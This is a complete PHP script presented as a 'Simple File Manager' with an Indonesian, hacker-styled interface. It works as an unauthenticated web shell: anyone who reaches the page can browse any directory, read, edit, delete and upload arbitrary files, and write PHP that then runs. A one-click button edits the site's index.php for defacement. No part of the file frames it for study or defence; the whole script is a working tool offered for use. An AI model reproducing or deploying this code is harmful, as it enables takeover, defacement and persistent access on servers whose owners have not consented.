<?php
// ============================================
// SIMPLE FILE MANAGER - MechaPowerBot Edition
// ============================================

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$message = '';

// Handle file edit save
if(isset($_POST['save_file'])) {
    $file_path = $_POST['file_path'];
    $content = $_POST['file_content'];
    if(file_put_contents($file_path, $content)) {
        $message = '<div style="color: #00ff00;">✓ File berhasil disimpan!</div>';
    } else {
        $message = '<div style="color: #ff0000;">✗ Gagal menyimpan file!</div>';
    }
}

// Handle file delete
if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if(unlink($file)) {
        $message = '<div style="color: #00ff00;">✓ File berhasil dihapus!</div>';
    }
}

// Handle file create
if(isset($_POST['create_file'])) {
    $new_file = $_POST['new_file_name'];
    if(!file_exists($new_file)) {
        file_put_contents($new_file, '');
        $message = '<div style="color: #00ff00;">✓ File berhasil dibuat!</div>';
    }
}

// Handle folder create
if(isset($_POST['create_folder'])) {
    $new_folder = $_POST['new_folder_name'];
    if(!is_dir($new_folder)) {
        mkdir($new_folder, 0777);
        $message = '<div style="color: #00ff00;">✓ Folder berhasil dibuat!</div>';
    }
}

// Handle file upload
if(isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $message = '<div style="color: #00ff00;">✓ File berhasil diupload!</div>';
    }
}

// Handle index.php edit specific
if(isset($_GET['edit_index'])) {
    $edit_file = 'index.php';
    $file_content = file_exists($edit_file) ? file_get_contents($edit_file) : '';
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Simple File Manager - Yang Mulia</title>
    <style>
        body {
            background: #0a0e1a;
            color: #00ff9d;
            font-family: 'Courier New', monospace;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            border: 1px solid #00ff9d;
            padding: 20px;
            border-radius: 5px;
        }
        h1, h2 {
            color: #00ff9d;
            text-shadow: 0 0 10px #00ff9d;
            border-bottom: 1px solid #00ff9d;
            padding-bottom: 10px;
        }
        .current-path {
            background: #1a1e2a;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 20px;
            border-left: 5px solid #00ff9d;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid #00ff9d;
            padding: 10px;
            text-align: left;
        }
        th {
            background: #1a1e2a;
            color: #00ff9d;
        }
        tr:hover {
            background: #1a1e2a;
        }
        a {
            color: #00ff9d;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
            color: #fff;
        }
        .btn {
            background: #1a1e2a;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            margin: 2px;
        }
        .btn:hover {
            background: #00ff9d;
            color: #0a0e1a;
        }
        .btn-danger {
            border-color: #ff5555;
            color: #ff5555;
        }
        .btn-danger:hover {
            background: #ff5555;
            color: #0a0e1a;
        }
        textarea {
            width: 100%;
            height: 400px;
            background: #1a1e2a;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            padding: 10px;
            font-family: 'Courier New', monospace;
            border-radius: 3px;
        }
        input[type=text] {
            background: #1a1e2a;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            padding: 8px;
            width: 300px;
            border-radius: 3px;
        }
        .message {
            padding: 10px;
            margin: 10px 0;
            border: 1px solid;
            border-radius: 3px;
        }
        .file-icon {
            margin-right: 10px;
        }
        .editor-container {
            margin-top: 30px;
            border-top: 1px solid #00ff9d;
            padding-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>😈 SIMPLE FILE MANAGER - Yang Mulia</h1>
        
        <?php echo $message; ?>
        
        <div class="current-path">
            📁 Current Directory: <strong><?php echo htmlspecialchars($current_dir); ?></strong>
        </div>
        
        <!-- Toolbar -->
        <div style="margin-bottom: 20px;">
            <form method="POST" style="display: inline-block;">
                <input type="text" name="new_file_name" placeholder="nama_file.php" required>
                <button type="submit" name="create_file" class="btn">+ Buat File</button>
            </form>
            
            <form method="POST" style="display: inline-block;">
                <input type="text" name="new_folder_name" placeholder="nama_folder" required>
                <button type="submit" name="create_folder" class="btn">+ Buat Folder</button>
            </form>
            
            <form method="POST" enctype="multipart/form-data" style="display: inline-block;">
                <input type="file" name="upload_file" required style="color: #00ff9d;">
                <button type="submit" class="btn">📤 Upload</button>
            </form>
            
            <a href="?edit_index=1" class="btn">📝 Edit index.php</a>
            <a href="?dir=." class="btn">🏠 Home</a>
        </div>
        
        <!-- File List -->
        <h2>📂 File & Folder List</h2>
        <table>
            <tr>
                <th>Type</th>
                <th>Name</th>
                <th>Size</th>
                <th>Permissions</th>
                <th>Last Modified</th>
                <th>Actions</th>
            </tr>
            
            <?php
            if($current_dir != '.' && $current_dir != '/') {
                $parent = dirname($current_dir);
                echo '<tr>';
                echo '<td>📁</td>';
                echo '<td><a href="?dir=' . urlencode($parent) . '">.. (Parent)</a></td>';
                echo '<td>-</td>';
                echo '<td>-</td>';
                echo '<td>-</td>';
                echo '<td>-</td>';
                echo '</tr>';
            }
            
            $files = scandir($current_dir);
            foreach($files as $file) {
                if($file == '.' || $file == '..') continue;
                
                $full_path = $current_dir . '/' . $file;
                $is_dir = is_dir($full_path);
                $type = $is_dir ? '📁' : '📄';
                $size = $is_dir ? '-' : formatBytes(filesize($full_path));
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                $modified = date('Y-m-d H:i:s', filemtime($full_path));
                
                echo '<tr>';
                echo '<td>' . $type . '</td>';
                
                if($is_dir) {
                    echo '<td><a href="?dir=' . urlencode($full_path) . '">' . htmlspecialchars($file) . '</a></td>';
                } else {
                    echo '<td>' . htmlspecialchars($file) . '</td>';
                }
                
                echo '<td>' . $size . '</td>';
                echo '<td>' . $perms . '</td>';
                echo '<td>' . $modified . '</td>';
                echo '<td>';
                
                if(!$is_dir) {
                    echo '<a href="?edit=' . urlencode($full_path) . '&dir=' . urlencode($current_dir) . '" class="btn">✏️ Edit</a>';
                    echo '<a href="?delete=' . urlencode($full_path) . '&dir=' . urlencode($current_dir) . '" class="btn btn-danger" onclick="return confirm(\'Yakin hapus file ini?\')">🗑️ Hapus</a>';
                }
                
                echo '</td>';
                echo '</tr>';
            }
            
            function formatBytes($bytes, $precision = 2) {
                $units = ['B', 'KB', 'MB', 'GB'];
                $bytes = max($bytes, 0);
                $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                $pow = min($pow, count($units) - 1);
                return round($bytes / pow(1024, $pow), $precision) . ' ' . $units[$pow];
            }
            ?>
        </table>
        
        <!-- File Editor -->
        <?php if(isset($_GET['edit']) || isset($_GET['edit_index'])): 
            $edit_file = isset($_GET['edit']) ? $_GET['edit'] : 'index.php';
            $file_content = file_exists($edit_file) ? file_get_contents($edit_file) : '';
        ?>
        <div class="editor-container">
            <h2>✏️ Editing: <?php echo htmlspecialchars($edit_file); ?></h2>
            
            <form method="POST">
                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($edit_file); ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br><br>
                <button type="submit" name="save_file" class="btn">💾 Simpan File</button>
                <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">↩️ Kembali</a>
            </form>
        </div>
        <?php endif; ?>
        
        <!-- Quick Edit untuk index.php -->
        <?php if(isset($_GET['edit_index']) || basename($edit_file ?? '') == 'index.php'): ?>
        <div style="margin-top: 20px; border-top: 2px solid #00ff9d; padding-top: 20px;">
            <h3>⚡ Quick Info:</h3>
            <p>File index.php sedang Anda edit, Yang Mulia. File ini adalah halaman utama website.</p>
            <p style="color: #ffff00;">Tip: Tambahkan kode PHP atau HTML sesuai keinginan Anda!</p>
        </div>
        <?php endif; ?>
        
    </div>
</body>
</html>
